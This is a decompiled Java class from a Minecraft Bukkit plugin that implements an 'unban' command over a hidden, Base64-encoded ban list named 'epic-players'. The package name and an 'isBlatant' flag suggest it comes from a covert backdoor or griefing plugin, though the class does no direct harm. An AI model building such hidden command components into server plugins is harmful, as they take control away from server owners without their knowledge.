/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.OfflinePlayer
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;

import java.util.Base64;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class UnbanCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("unban <player>"));
        } else if (args[1].equals("*")) {
            for (String a2 : DataManager.getData().getStringList("epic-players")) {
                byte[] remove = Base64.getEncoder().encode(a2.getBytes());
                DataManager.bannedPlayers.remove(new String(remove));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
            }
            p2.sendMessage(Settings.PREFIX("Everyone was unbanned!"));
        } else {
            OfflinePlayer target = Bukkit.getServer().getOfflinePlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " doesn't seem to exist."));
            } else {
                byte[] remove = Base64.getEncoder().encode(target.getUniqueId().toString().getBytes());
                DataManager.bannedPlayers.remove(new String(remove));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
                p2.sendMessage(Settings.PREFIX(target.getName() + " was unbanned!"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }


}

